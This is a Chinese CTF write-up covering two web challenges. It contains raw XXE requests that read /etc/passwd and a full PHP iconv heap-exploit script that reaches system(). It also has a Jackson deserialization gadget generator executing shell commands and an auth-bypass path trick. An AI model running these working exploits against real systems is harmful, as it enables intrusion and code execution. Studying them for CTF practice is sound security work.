+++
title= "Polarisctf 2026"
slug= "polarisctf-2026"
description= ""
date= "2026-04-04T12:04:07+08:00"
lastmod= "2026-04-04T12:04:07+08:00"
image= ""
license= ""
categories= ["CTF"]
tags= [""]

+++

## 头像上传器

/api/avatar.php 可以打 XXE，可以解析 `php://filter`所以直接打 filter-chain，

```http
POST /api/upload.php HTTP/1.1
Host: 80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn
Content-Length: 392
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBn7FqU28RNwXElDx
Accept: */*
Origin: http://80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn
Referer: http://80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn/home.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: _ga=GA1.1.360932415.1774506199; _clck=1j4ja68%5E2%5Eg4r%5E0%5E2276; _ga_BFDVYZJ3DE=GS2.1.s1774772786$o6$g0$t1774772786$j60$l0$h0; _clsk=970rhe%5E1774772788346%5E1%5E1%5Ei.clarity.ms%2Fcollect; PHPSESSID=j6eirikj9ds15has0ctqptmiro
Connection: keep-alive

------WebKitFormBoundaryBn7FqU28RNwXElDx
Content-Disposition: form-data; name="file"; filename="1.svg"
Content-Type: image/svg+xml

<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>

------WebKitFormBoundaryBn7FqU28RNwXElDx--
```

保存

```http
POST /api/update_profile.php HTTP/1.1
Host: 80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn
Content-Length: 60
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn
Referer: http://80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn/home.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: _ga=GA1.1.360932415.1774506199; _clck=1j4ja68%5E2%5Eg4r%5E0%5E2276; _ga_BFDVYZJ3DE=GS2.1.s1774772786$o6$g0$t1774772786$j60$l0$h0; _clsk=970rhe%5E1774772788346%5E1%5E1%5Ei.clarity.ms%2Fcollect; PHPSESSID=j6eirikj9ds15has0ctqptmiro
Connection: keep-alive

{"display_name":"test","avatar_name":"0b403f917f196872.svg"}
```

读取

```http
GET /api/avatar.php HTTP/1.1
Host: 80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: _ga=GA1.1.360932415.1774506199; _clck=1j4ja68%5E2%5Eg4r%5E0%5E2276; _ga_BFDVYZJ3DE=GS2.1.s1774772786$o6$g0$t1774772786$j60$l0$h0; _clsk=970rhe%5E1774772788346%5E1%5E1%5Ei.clarity.ms%2Fcollect; PHPSESSID=j6eirikj9ds15has0ctqptmiro
Connection: keep-alive
```

不得不说这题很不错，

```python
## https://github.com/kezibei/php-filter-iconv
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import html
import random
import re
import string
import time
import zlib
from dataclasses import dataclass
from pathlib import Path

import requests
from pwn import ELF, p64


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")
FILTERS = [
    "zlib.inflate",
    "zlib.inflate",
    "dechunk",
    "convert.iconv.latin1.latin1",
    "dechunk",
    "convert.iconv.latin1.latin1",
    "dechunk",
    "convert.iconv.latin1.latin1",
    "dechunk",
    "convert.iconv.UTF-8.ISO-2022-CN-EXT",
    "convert.quoted-printable-decode",
    "convert.iconv.latin1.latin1",
]


@dataclass
class Region:
    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


def chunked_chunk(data: bytes, size: int | None = None) -> bytes:
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


def compressed_bucket(data: bytes) -> bytes:
    return chunked_chunk(data, 0x8000)


def compress_raw(data: bytes) -> bytes:
    return zlib.compress(data, 9)[2:-4]


def qpe(data: bytes) -> bytes:
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs: int, size: int | None = None) -> bytes:
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    return compressed_bucket(bucket)


def parse_regions(maps: bytes) -> list[Region]:
    regions = []
    pattern = re.compile(
        r"^([a-f0-9]+)-([a-f0-9]+)\b.*\s([-rwx]{3}[ps])\s(.*)"
    )
    for line in maps.decode("utf-8", "ignore").splitlines():
        match = pattern.match(line)
        if not match:
            continue
        start = int(match.group(1), 16)
        stop = int(match.group(2), 16)
        permissions = match.group(3)
        path = match.group(4)
        if "/" in path or "[" in path:
            path = path.rsplit(" ", 1)[-1]
        else:
            path = ""
        regions.append(Region(start, stop, permissions, path))
    return regions


def find_main_heap(regions: list[Region]) -> int:
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == "rw-p"
        and region.size >= HEAP_SIZE
        and region.stop & (HEAP_SIZE - 1) == 0
        and region.path in ("", "[anon:zend_alloc]")
    ]
    if not heaps:
        raise RuntimeError("unable to find zend heap")
    return heaps[0]


def find_libc_region(regions: list[Region]) -> Region:
    for region in regions:
        if "libc-" in region.path or "libc.so" in region.path:
            return region
    raise RuntimeError("unable to find libc mapping")


def build_resource(libc: ELF, heap: int, command: str, pad: int, sleep: int) -> bytes:
    addr_emalloc = libc.symbols["__libc_malloc"]
    addr_efree = libc.symbols["__libc_system"]
    addr_erealloc = libc.symbols["__libc_realloc"]
    addr_free_slot = heap + 0x20
    addr_custom_heap = heap + 0x0168
    addr_fake_bin = addr_free_slot - 0x10
    chunk_size = 0x100

    pad_size = chunk_size - 0x18
    pad_block = b"\x00" * pad_size
    pad_block = chunked_chunk(pad_block, len(pad_block) + 6)
    pad_block = chunked_chunk(pad_block, len(pad_block) + 6)
    pad_block = chunked_chunk(pad_block, len(pad_block) + 6)
    pad_block = compressed_bucket(pad_block)

    step1 = b"\x00"
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, chunk_size)
    step1 = compressed_bucket(step1)

    step2_size = 0x48
    step2 = b"\x00" * (step2_size + 8)
    step2 = chunked_chunk(step2, chunk_size)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(addr_fake_bin)
    step2_write_ptr = chunked_chunk(step2_write_ptr, chunk_size)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3 = b"\x00" * chunk_size
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b"\x00" * (chunk_size - len(BUG)) + BUG
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4 = b"=00" + b"\x00" * (chunk_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    step4_pwn = ptr_bucket(
        0x200000,
        0,
        0,
        0,
        addr_custom_heap,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        heap,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=chunk_size,
    )

    step4_custom_heap = ptr_bucket(addr_emalloc, addr_efree, addr_erealloc, size=0x18)

    command = f"kill -9 $PPID; {command}"
    if sleep:
        command = f"sleep {sleep}; {command}"
    command_bytes = command.encode() + b"\x00"
    command_bytes = command_bytes.ljust(0x140, b"\x00")

    step4_use_custom_heap = qpe(command_bytes)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
        step4 * 3
        + step4_pwn
        + step4_custom_heap
        + step4_use_custom_heap
        + step3_overflow
        + pad_block * pad
        + step1 * 3
        + step2_write_ptr
        + step2 * 2
    )
    return compress_raw(compress_raw(pages))


class Exploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 nested-cnext-xxe"
        self._login()

    @staticmethod
    def _rand(length: int = 8) -> str:
        alphabet = string.ascii_lowercase + string.digits
        return "".join(random.choice(alphabet) for _ in range(length))

    def _login(self) -> None:
        username = f"u{self._rand()}"
        password = f"P{self._rand(10)}"
        self.session.post(
            f"{self.base_url}/api/register.php",
            json={"username": username, "password": password},
            timeout=15,
        ).raise_for_status()
        self.session.post(
            f"{self.base_url}/api/login.php",
            json={"username": username, "password": password},
            timeout=15,
        ).raise_for_status()

    def upload_raw(self, name: str, body: bytes, ctype: str = "application/octet-stream") -> str:
        response = self.session.post(
            f"{self.base_url}/api/upload.php",
            files={"file": (name, body, ctype)},
            timeout=20,
        )
        response.raise_for_status()
        return response.json()["name"]

    def trigger_uri(self, uri: str) -> requests.Response:
        svg = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{html.escape(uri, quote=True)}">]>'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        ).encode()
        avatar_name = self.upload_raw("p.svg", svg, "image/svg+xml")
        self.session.post(
            f"{self.base_url}/api/update_profile.php",
            json={"display_name": "x", "avatar_name": avatar_name},
            timeout=15,
        ).raise_for_status()
        return self.session.get(f"{self.base_url}/api/avatar.php", timeout=20)

    def read_file(self, path: str) -> bytes:
        response = self.trigger_uri(f"php://filter/convert.base64-encode/resource={path}")
        match = re.search(r"<text[^>]*>(.*?)</text>", response.text, re.S)
        if not match:
            raise RuntimeError(f"no xxe text for {path}: {response.text[:120]!r}")
        return base64.b64decode(html.unescape(match.group(1)).strip() + "===", validate=False)

    def build_nested_payload(self, command: str, pad: int, sleep: int) -> str:
        maps = self.read_file("/proc/self/maps")
        regions = parse_regions(maps)
        heap = find_main_heap(regions)
        libc_region = find_libc_region(regions)
        libc_bytes = self.read_file(libc_region.path)

        workdir = Path("/tmp/exp_nested_cnext_xxe")
        workdir.mkdir(parents=True, exist_ok=True)
        libc_path = workdir / "libc.so"
        libc_path.write_bytes(libc_bytes)

        libc = ELF(str(libc_path), checksec=False)
        libc.address = libc_region.start

        resource = build_resource(libc, heap, command, pad, sleep)
        blob_name = self.upload_raw("blob.gif", resource, "image/gif")
        path = f"/var/www/html/uploads/{blob_name}"
        for flt in FILTERS:
            path = f"php://filter/read={flt}/resource={path}"
        return path

    def run(self, command: str, output_name: str, pad: int, sleep: int) -> str:
        payload = self.build_nested_payload(command, pad, sleep)
        self.trigger_uri(payload)
        time.sleep(sleep + 1)
        response = requests.get(f"{self.base_url}/uploads/{output_name}", timeout=10)
        response.raise_for_status()
        return response.text


def main() -> None:
    parser = argparse.ArgumentParser(description="Nested php://filter CNEXT XXE exploit")
    parser.add_argument("url", help="Challenge base URL")
    parser.add_argument(
        "--command",
        default='sh -c "/readflag" >/var/www/html/uploads/flag.txt 2>&1',
        help="Command executed through system()",
    )
    parser.add_argument("--output", default="flag.txt", help="File created under /uploads/")
    parser.add_argument("--pad", type=int, default=20, help="Padding chunk count")
    parser.add_argument("--sleep", type=int, default=1, help="Exploit sleep value")
    args = parser.parse_args()

    data = Exploit(args.url).run(args.command, args.output, args.pad, args.sleep)
    print(data)


if __name__ == "__main__":
    main()



## python3 exp.py 'http://80-5f7b9a82-754e-4797-9a96-f13ac6f12b01.challenge.ctfplus.cn'
```

## polaris oa

这题主要是测试 Codex 和 jar-analyzer 之前的合作，首先我让 Codex 自行配对了 MCP

https://fushuling.com/index.php/2025/08/17/%e7%bb%95%e8%bf%87%e8%a1%a5%e4%b8%81%ef%bc%8c%e5%86%8d%e6%ac%a1%e5%ae%9e%e7%8e%b0%e5%8d%8e%e5%a4%8ferp%e6%9c%aa%e6%8e%88%e6%9d%83rce%e5%b7%b2%e4%bf%ae%e5%a4%8d/ 这里面涉及的越权姿势有异曲同工一秒，直接/user/..;1=1/admin就可以到管理员面板了，然后正常审计整个漏洞链为

越权 → 上传文件 → parseService 生成 _parsed → checkIsSign 路径穿越覆写 _parsed → deserializeData 触发反序列化，这里直接打 Jackson 链就行。

https://baozongwi.xyz/p/jackson-deserialization/#signobjectgetobject

```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.CtNewConstructor;
import javassist.CtNewMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;

public class JacksonSignedObjectGenerator {
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println("Usage: JacksonSignedObjectGenerator <output.ser> <command>");
            System.exit(1);
        }

        String outputFile = args[0];
        String command = args[1];
        byte[] payload = buildPayload(command);

        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
            fos.write(payload);
        }

        System.out.println("wrote " + outputFile + " (" + payload.length + " bytes)");
    }

    private static byte[] buildPayload(String command) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{createTransletBytes(command)});

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        Object proxyTemplates = getPojoNodeStableProxy(templates);
        SignedObject signedObject = new SignedObject((Serializable) proxyTemplates, keyPair.getPrivate(), Signature.getInstance("DSA"));

        ClassPool pool = ClassPool.getDefault();
        CtClass nodeClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = nodeClass.getDeclaredMethod("writeReplace");
        nodeClass.removeMethod(writeReplace);
        nodeClass.toClass();

        POJONode jsonNode = new POJONode(signedObject);
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        setFieldValue(exception, "val", jsonNode);

        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(exception);
        }
        return baos.toByteArray();
    }

    private static byte[] createTransletBytes(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        String className = "JacksonExploitTranslet" + System.nanoTime();
        CtClass clazz = pool.makeClass(className);
        clazz.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        clazz.addConstructor(CtNewConstructor.defaultConstructor(clazz));

        CtConstructor clinit = clazz.makeClassInitializer();
        clinit.setBody(buildStaticInitializer(command));

        clazz.addMethod(CtNewMethod.make(
                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                        "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) " +
                        "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));
        clazz.addMethod(CtNewMethod.make(
                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                        "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, " +
                        "com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) " +
                        "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));

        byte[] bytes = clazz.toBytecode();
        clazz.detach();
        return bytes;
    }

    private static String buildStaticInitializer(String command) {
        String escaped = command
                .replace("\\", "\\\\")
                .replace("\"", "\\\"");
        return "{"
                + "try {"
                + "  java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"});"
                + "} catch (Throwable t) {"
                + "  t.printStackTrace();"
                + "}"
                + "}";
    }

    private static Object getPojoNodeStableProxy(Object templatesImpl) throws Exception {
        Class<?> proxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> constructor = proxyClass.getDeclaredConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);

        return Proxy.newProxyInstance(
                proxyClass.getClassLoader(),
                new Class[]{Templates.class, Serializable.class},
                handler
        );
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field targetField = null;
        Class<?> current = obj.getClass();
        while (current != null) {
            try {
                targetField = current.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException ignored) {
                current = current.getSuperclass();
            }
        }
        if (targetField == null) {
            throw new NoSuchFieldException(fieldName);
        }
        targetField.setAccessible(true);
        targetField.set(obj, value);
    }
}
```

看到 start.sh 

```shell
#!/bin/sh

if [ "$FLAG" ]; then
    echo $FLAG > /f14g
    chmod 444 /f14g
    export FLAG=""
fi

java -jar /app/polaris.jar
```

## 小结

其他题不想写，这两题比较有意思，这个XXE打filter-chain，我之前看了很多次的CMS，硬是没找到这种利用的，出题人film应该是写了文件包含触发协议的那种方式，挺好的一道题目🤤
